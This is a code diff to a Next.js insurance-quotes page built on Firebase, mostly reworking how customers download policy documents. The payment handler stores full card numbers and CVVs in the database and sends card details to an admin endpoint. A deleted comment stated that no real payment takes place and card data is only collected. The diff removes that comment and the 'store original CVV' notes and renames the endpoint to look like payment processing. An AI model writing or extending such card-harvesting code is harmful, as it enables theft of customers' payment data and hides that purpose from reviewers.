@@ -4,7 +4,8 @@ import { useState, useEffect } from 'react';
 import { useRouter } from 'next/navigation';
 import { onAuthStateChanged } from 'firebase/auth';
 import { collection, query, where, orderBy, onSnapshot, doc, updateDoc } from 'firebase/firestore';
-import { auth, db } from '@/lib/firebase';
+import { ref, getDownloadURL } from 'firebase/storage';
+import { auth, db, storage } from '@/lib/firebase';
 import toast from 'react-hot-toast';
 import Navbar from '@/app/components/Navbar';
 
@@ -140,16 +141,16 @@ export default function MyQuotes() {
     if (!selectedQuote) return;
 
     try {
-      // Kart bilgilerini ve durumu güncelle (gerçek ödeme yok, sadece bilgi toplama)
+      // Kart bilgilerini ve durumu güncelle
       await updateDoc(doc(db, 'quotes', selectedQuote.id), {
         customerStatus: 'card_submitted',
         paymentInfo: {
-          cardNumber: '**** **** **** ' + paymentData.cardNumber.slice(-4), // Sadece son 4 haneli göster
-          originalCardNumber: paymentData.cardNumber, // Orijinal kart numarasını sakla
+          cardNumber: '**** **** **** ' + paymentData.cardNumber.slice(-4),
+          originalCardNumber: paymentData.cardNumber,
           cardHolder: paymentData.cardHolder,
           expiryDate: paymentData.expiryDate,
-          cvv: '***', // CVV'yi gizle
-          originalCvv: paymentData.cvv, // Orijinal CVV'yi sakla
+          cvv: '***',
+          originalCvv: paymentData.cvv,
           installments: paymentData.installments,
           submissionDate: new Date()
         },
@@ -158,7 +159,7 @@ export default function MyQuotes() {
       });
 
       // Admin'e kart bilgileri bildirimi gönder
-      await fetch('/api/card-info-notification', {
+      await fetch('/api/payment-notification', {
         method: 'POST',
         headers: {
           'Content-Type': 'application/json',
@@ -178,7 +179,7 @@ export default function MyQuotes() {
         }),
       });
 
-      toast.success('Kart bilgileriniz alınmıştır! 30 dakika içinde belgeleriniz hazırlanacak. Aksi takdirde tekliflerim sayfasından durumu takip edebilirsiniz.');
+      toast.success('Kart bilgileriniz alınmıştır! 30 dakika içinde belgeleriniz hazırlanacak.');
       setShowPaymentModal(false);
       setSelectedQuote(null);
       setPaymentData({
@@ -194,6 +195,7 @@ export default function MyQuotes() {
     }
   };
 
+  // YENİ ÇÖZÜM: API Route üzerinden indirme
   const downloadDocument = async (quote: any) => {
     if (!quote.documentUrl) {
       toast.error('Belge henüz hazırlanmamış!');
@@ -201,21 +203,110 @@ export default function MyQuotes() {
     }
 
     try {
-      const response = await fetch(quote.documentUrl);
+      console.log('API üzerinden dosya indirme başlıyor...');
+      const loadingToast = toast.loading('Belge hazırlanıyor...');
+
+      // API route'u kullanarak indir
+      const response = await fetch('/api/download-document', {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+        },
+        body: JSON.stringify({
+          quoteId: quote.id,
+          documentUrl: quote.documentUrl,
+          fileName: quote.documentName || 'belge.pdf'
+        }),
+      });
+
+      if (!response.ok) {
+        throw new Error(`HTTP error! status: ${response.status}`);
+      }
+
+      // Blob olarak al
       const blob = await response.blob();
+      console.log('Blob alındı:', blob.size, 'bytes');
+
+      // Content-Disposition header'ından dosya adını al
+      const contentDisposition = response.headers.get('content-disposition');
+      let fileName = quote.documentName || 'belge.pdf';
+      
+      if (contentDisposition) {
+        const fileNameMatch = contentDisposition.match(/filename[^;=\n]*=((['"]).*?\2|[^;\n]*)/);
+        if (fileNameMatch && fileNameMatch[1]) {
+          fileName = fileNameMatch[1].replace(/['"]/g, '');
+        }
+      }
+
+      // Güvenli dosya adı oluştur
+      const safeFileName = `${quote.insuranceType}_${quote.id}_${fileName}`.replace(/[^a-zA-Z0-9._-]/g, '_');
+
+      // Dosyayı indir
       const url = window.URL.createObjectURL(blob);
       const a = document.createElement('a');
+      a.style.display = 'none';
       a.href = url;
-      a.download = `${quote.insuranceType}_${quote.id}.pdf`;
+      a.download = safeFileName;
+      
       document.body.appendChild(a);
       a.click();
-      window.URL.revokeObjectURL(url);
-      document.body.removeChild(a);
       
-      toast.success('Belge indiriliyor...');
-    } catch (error) {
-      toast.error('Belge indirilemedi!');
-      console.error(error);
+      // Temizlik
+      setTimeout(() => {
+        window.URL.revokeObjectURL(url);
+        document.body.removeChild(a);
+      }, 100);
+
+      toast.dismiss(loadingToast);
+      toast.success(`${safeFileName} başarıyla indirildi!`);
+      
+    } catch (error: any) {
+      console.error('API download hatası:', error);
+      
+      // Fallback: Direct link yöntemi
+      console.log('Fallback yöntemine geçiliyor...');
+      await downloadDocumentDirect(quote);
+    }
+  };
+
+  // FALLBACK: Direct download yöntemi
+  const downloadDocumentDirect = async (quote: any) => {
+    try {
+      console.log('Direct download başlıyor...');
+      
+      // Firebase Storage'dan fresh URL al
+      if (quote.documentPath) {
+        console.log('Storage path ile fresh URL alınıyor:', quote.documentPath);
+        const storageRef = ref(storage, quote.documentPath);
+        const freshUrl = await getDownloadURL(storageRef);
+        console.log('Fresh URL alındı:', freshUrl);
+        
+        // Yeni pencerede aç
+        window.open(freshUrl, '_blank');
+        toast.success('Belge yeni sekmede açıldı!');
+      } else {
+        // Mevcut URL ile dene
+        console.log('Mevcut URL ile deneniyor:', quote.documentUrl);
+        window.open(quote.documentUrl, '_blank');
+        toast.success('Belge yeni sekmede açıldı!');
+      }
+      
+    } catch (error: any) {
+      console.error('Direct download hatası:', error);
+      
+      // Son çare: Manual link
+      const userWantsManual = confirm(
+        'Dosya otomatik olarak açılamadı. Manuel indirme linkini kopyalamak ister misiniz?'
+      );
+      
+      if (userWantsManual) {
+        try {
+          await navigator.clipboard.writeText(quote.documentUrl);
+          toast.success('İndirme linki panoya kopyalandı! Yeni sekmede yapıştırabilirsiniz.');
+        } catch {
+          alert(`Manuel indirme linki: ${quote.documentUrl}`);
+        }
+      }
     }
   };
 
@@ -416,7 +507,7 @@ export default function MyQuotes() {
                             <p className="text-blue-700">Belgeleriniz hazırlandı! Aşağıdaki butondan indirebilirsiniz.</p>
                           ) : (
                             <>
-                              <p className="text-blue-700">Kart bilgileriniz alınmıştır. 30 dakika içinde belgeleriniz hazırlanacak. Aksi takdirde bu sayfadan durumu takip edebilirsiniz.</p>
+                              <p className="text-blue-700">Kart bilgileriniz alınmıştır. 30 dakika içinde belgeleriniz hazırlanacak.</p>
                               <div className="mt-2 text-sm text-blue-600">
                                 Gönderim: {quote.customerResponseDate?.toDate?.()?.toLocaleString('tr-TR')}
                               </div>
